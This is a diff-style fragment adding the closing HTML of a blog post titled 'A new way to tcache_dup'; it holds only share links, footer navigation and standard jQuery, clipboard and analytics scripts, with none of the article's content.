+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://fern89.github.io/2025/09/20/doublefree/&is_video=false&description=A new way to tcache_dup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=A new way to tcache_dup&body=Check out this article: https://fern89.github.io/2025/09/20/doublefree/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://fern89.github.io/2025/09/20/doublefree/&title=A new way to tcache_dup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://fern89.github.io/2025/09/20/doublefree/&title=A new way to tcache_dup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://fern89.github.io/2025/09/20/doublefree/&title=A new way to tcache_dup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://fern89.github.io/2025/09/20/doublefree/&title=A new way to tcache_dup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://fern89.github.io/2025/09/20/doublefree/&name=A new way to tcache_dup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://fern89.github.io/2025/09/20/doublefree/&t=A new way to tcache_dup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    fern
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "e2c0a56b5d4d466baf300058fd41c3e8"}'></script>
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
